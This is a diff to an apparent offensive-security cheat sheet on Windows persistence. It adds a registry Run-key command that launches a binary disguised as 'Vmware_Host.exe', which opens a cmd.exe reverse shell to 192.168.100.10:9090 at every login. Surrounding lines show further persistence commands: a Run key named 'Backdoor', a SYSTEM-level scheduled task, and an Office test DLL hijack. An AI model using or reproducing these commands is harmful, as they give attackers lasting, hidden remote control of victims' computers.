@@ -3,7 +3,7 @@
 ### Registry Persistent
 ```
 #Userland AutoRun Persistence:
-
+REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\KarMarKhaing\Vmware_Host.exe -e cmd.exe 192.168.100.10 9090"
 reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe
@@ -29,4 +29,11 @@ schtasks /create /ru "SYSTEM" /tn "System_Persistence" /tr "cmd.exe /c C:\Users\
 ```
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\Users\KarMarKhaing\Service.dll
 ```
+### 
+```
+dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+
+```
+
 
